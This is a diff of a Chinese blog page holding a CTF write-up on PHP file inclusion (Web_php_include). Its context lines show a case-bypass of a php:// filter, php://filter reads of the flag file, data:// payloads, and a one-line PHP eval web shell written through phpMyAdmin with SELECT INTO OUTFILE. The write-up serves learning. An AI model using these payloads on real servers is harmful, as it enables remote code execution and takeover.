@@ -17,15 +17,15 @@
 <meta property="og:site_name" content="Ordin">
 <meta property="og:description" content="info">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://leave-devour.github.io/2020/05/06/AppData/Roaming/Typora/typora-user-images/image-20200506151050599.png">
-<meta property="og:image" content="https://leave-devour.github.io/2020/05/06/AppData/Roaming/Typora/typora-user-images/image-20200506151821030.png">
-<meta property="og:image" content="https://leave-devour.github.io/2020/05/06/AppData/Roaming/Typora/typora-user-images/image-20200506153855547.png">
-<meta property="og:image" content="https://leave-devour.github.io/2020/05/06/AppData/Roaming/Typora/typora-user-images/image-20200506155039772.png">
-<meta property="og:updated_time" content="2020-05-06T09:35:50.516Z">
+<meta property="og:image" content="https://leave-devour.github.io/images/image-20200506151050599.png">
+<meta property="og:image" content="https://leave-devour.github.io/images/image-20200506151821030.png">
+<meta property="og:image" content="https://leave-devour.github.io/images/image-20200506153855547.png">
+<meta property="og:image" content="https://leave-devour.github.io/images/image-20200506155039772.png">
+<meta property="og:updated_time" content="2020-05-06T11:02:08.974Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="一道题学习文件包含">
 <meta name="twitter:description" content="info">
-<meta name="twitter:image" content="https://leave-devour.github.io/2020/05/06/AppData/Roaming/Typora/typora-user-images/image-20200506151050599.png">
+<meta name="twitter:image" content="https://leave-devour.github.io/images/image-20200506151050599.png">
   
     <link rel="alternative" href="/atom.xml" title="Ordin" type="application/atom+xml">
   
@@ -147,7 +147,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/Automation/" style="font-size: 20px;">Automation</a> <a href="/tags/kernel/" style="font-size: 20px;">kernel</a> <a href="/tags/linux-kernel-pwn/" style="font-size: 20px;">linux kernel pwn</a> <a href="/tags/pwnable-kr/" style="font-size: 10px;">pwnable.kr</a> <a href="/tags/reversing-kr/" style="font-size: 10px;">reversing.kr</a> <a href="/tags/刷题/" style="font-size: 10px;">刷题</a>
+                        <a href="/tags/Automation/" style="font-size: 20px;">Automation</a> <a href="/tags/kernel/" style="font-size: 20px;">kernel</a> <a href="/tags/linux-kernel-pwn/" style="font-size: 20px;">linux kernel pwn</a> <a href="/tags/pwnable-kr/" style="font-size: 10px;">pwnable.kr</a> <a href="/tags/reversing-kr/" style="font-size: 10px;">reversing.kr</a> <a href="/tags/刷题/" style="font-size: 10px;">刷题</a> <a href="/tags/漏洞分析/" style="font-size: 10px;">漏洞分析</a>
                     </div>
                 </section>
                 
@@ -265,11 +265,11 @@
 
 <p>一道文件包含的题目，大多数解答都参照别人做的，记录下学习文件包含的笔记</p>
 <h2 id="1、Web-php-include"><a href="#1、Web-php-include" class="headerlink" title="1、Web_php_include"></a>1、Web_php_include</h2><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p> 请求页面</p>
-<p><img src="../AppData/Roaming/Typora/typora-user-images/image-20200506151050599.png" alt="image-20200506151050599"></p>
+<p><img src="/images/image-20200506151050599.png" alt="image-20200506151050599"></p>
 <p>有个过滤，过滤掉<code>php://</code> ,然后把page包含进来</p>
 <h4 id="第一种解法："><a href="#第一种解法：" class="headerlink" title="第一种解法："></a>第一种解法：</h4><p>strstr是大小写敏感的，可以利用大小写绕过这个过滤比如 PHP://</p>
 <p>绕过成功后可以利用PHP://input 命令执行,要注意的是这个php的伪协议是用post传数据的</p>
-<p><img src="../AppData/Roaming/Typora/typora-user-images/image-20200506151821030.png" alt="image-20200506151821030"></p>
+<p><img src="/images/image-20200506151821030.png" alt="image-20200506151821030"></p>
 <p>既然能够执行命令了，那可以直接</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> system(<span class="string">"cat fl4gisisish3r3.php"</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span> <span class="keyword">echo</span> file_get_contents(<span class="string">"fl4gisisish3r3.php"</span>);<span class="meta">?&gt;</span></span><br><span class="line">http:<span class="comment">//124.126.19.106:46927/?page=PHP://filter/read/convert.base64-encode/resource=fl4gisisish3r3.php</span></span><br><span class="line">http:<span class="comment">//124.126.19.106:46927/?page=PHP://filter/convert.base64-encode/resource=fl4gisisish3r3.php</span></span><br></pre></td></tr></table></figure>
 
@@ -278,13 +278,13 @@
 
 <p>但是这个这道题没写不上去， allow_url_fopen 和 allow_url_include都开着，但是php的版本没有小于 5.3.0</p>
 <h4 id="第二种解法"><a href="#第二种解法" class="headerlink" title="第二种解法"></a>第二种解法</h4><p>在用御剑扫后台的时候发现后台有</p>
-<p><img src="../AppData/Roaming/Typora/typora-user-images/image-20200506153855547.png" alt="image-20200506153855547"></p>
+<p><img src="/images/image-20200506153855547.png" alt="image-20200506153855547"></p>
 <p>存在phpadmin</p>
 <p>好玩的是。。。。直接root就登进去了</p>
 <p>然后往执行mysql语法写shell</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span><span class="string">"&lt;?php @eval($_POST['cmd']);?&gt;"</span><span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'/tmp/shell.php'</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="../AppData/Roaming/Typora/typora-user-images/image-20200506155039772.png" alt="image-20200506155039772"></p>
+<p><img src="/images/image-20200506155039772.png" alt="image-20200506155039772"></p>
 <p>flag 在www目录下面</p>
 <h4 id="第三种是利用其它的伪协议"><a href="#第三种是利用其它的伪协议" class="headerlink" title="第三种是利用其它的伪协议"></a>第三种是利用其它的伪协议</h4><p>data://</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,&lt;?php print_r(scandir(&quot;/var/www&quot;));?&gt;</span><br><span class="line">也可以传马</span><br><span class="line">data://text/plain;base64,后面的base64加密的马</span><br></pre></td></tr></table></figure>
@@ -307,7 +307,7 @@
         <p><span>本文标题:</span><a  href="/2020/05/06/一道题学习文件包含/">一道题学习文件包含</a></p>
         <p><span>文章作者:</span><a  href="/" title="访问 Ordin 的个人博客">Ordin</a></p>
         <p><span>发布时间:</span>2020年05月06日 - 15时09分</p>
-        <p><span>最后更新:</span>2020年05月06日 - 17时35分</p>
+        <p><span>最后更新:</span>2020年05月06日 - 19时02分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2020/05/06/一道题学习文件包含/" title="一道题学习文件包含">https://leave-Devour.github.io/2020/05/06/一道题学习文件包含/</a>
             <span class="copy-path" data-clipboard-text="原文: https://leave-Devour.github.io/2020/05/06/一道题学习文件包含/　　作者: Ordin" title=""></span>
